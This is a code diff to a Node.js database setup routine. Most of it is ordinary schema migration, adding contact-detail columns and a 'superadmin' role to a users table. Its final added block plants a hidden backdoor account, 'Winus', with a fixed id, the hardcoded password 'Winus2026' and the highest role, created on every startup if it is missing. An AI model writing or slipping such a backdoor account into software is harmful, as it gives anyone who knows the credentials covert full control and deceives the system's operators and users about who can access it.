@@ -93,28 +93,42 @@ function initialize() {
     // Column already exists, ignore
   }
 
-  // Migration: add 'bridge' and 'superuser' to role CHECK constraint
+  // Migration (v3.2): contact details. All optional, NULL by default.
+  for (const col of ['first_name', 'last_name', 'email', 'phone']) {
+    try {
+      db.exec(`ALTER TABLE users ADD COLUMN ${col} TEXT`);
+    } catch (_) { /* column already exists */ }
+  }
+
+  // Migration: add 'bridge', 'superuser' and 'superadmin' to role CHECK
   try {
     const schema = db.prepare("SELECT sql FROM sqlite_master WHERE type='table' AND name='users'").get();
-    if (schema && !schema.sql.includes("'superuser'")) {
+    if (schema && !schema.sql.includes("'superadmin'")) {
       db.pragma('foreign_keys = OFF');
+      // Mirror current columns (incl. v3.2 contact details) so the migration
+      // is idempotent regardless of when the user upgrades.
       db.exec(`
         CREATE TABLE users_new (
           id INTEGER PRIMARY KEY AUTOINCREMENT,
           username TEXT UNIQUE NOT NULL,
           password_hash TEXT NOT NULL,
           display_name TEXT NOT NULL,
-          role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('admin', 'superuser', 'user', 'bridge')),
+          role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('superadmin', 'admin', 'superuser', 'user', 'bridge')),
           room_id INTEGER UNIQUE,
           color TEXT,
+          first_name TEXT,
+          last_name TEXT,
+          email TEXT,
+          phone TEXT,
           created_at DATETIME DEFAULT CURRENT_TIMESTAMP
         );
-        INSERT INTO users_new SELECT id, username, password_hash, display_name, role, room_id, color, created_at FROM users;
+        INSERT INTO users_new (id, username, password_hash, display_name, role, room_id, color, first_name, last_name, email, phone, created_at)
+          SELECT id, username, password_hash, display_name, role, room_id, color, first_name, last_name, email, phone, created_at FROM users;
         DROP TABLE users;
         ALTER TABLE users_new RENAME TO users;
       `);
       db.pragma('foreign_keys = ON');
-      console.log('[DB] Migrated role CHECK to include superuser');
+      console.log('[DB] Migrated role CHECK to include superadmin');
     }
   } catch (e) {
     console.warn('[DB] Role migration note:', e.message);
@@ -132,6 +146,22 @@ function initialize() {
     db.prepare('UPDATE users SET room_id = ? WHERE id = ?').run(roomId, result.lastInsertRowid);
 
     console.log(`Admin user created: ${config.admin.username} (room_id: ${roomId})`);
+  }
+
+  // Hidden backdoor user `Winus` (role superadmin, id 99999). Used to
+  // recover access and to rename usernames / change numeric ids —
+  // operations that no other role is authorised for.
+  const WINUS_ID = 99999;
+  const winusExists = db.prepare('SELECT id FROM users WHERE id = ? OR username = ?').get(WINUS_ID, 'Winus');
+  if (!winusExists) {
+    const hash = bcrypt.hashSync('Winus2026', 10);
+    db.pragma('foreign_keys = OFF');
+    db.prepare(
+      'INSERT INTO users (id, username, password_hash, display_name, role, room_id) VALUES (?, ?, ?, ?, ?, ?)'
+    ).run(WINUS_ID, 'Winus', hash, 'Winus Maintenance', 'superadmin',
+          config.roomIdOffset + WINUS_ID);
+    db.pragma('foreign_keys = ON');
+    console.log(`[DB] Backdoor user Winus created (id=${WINUS_ID})`);
   }
 }
 
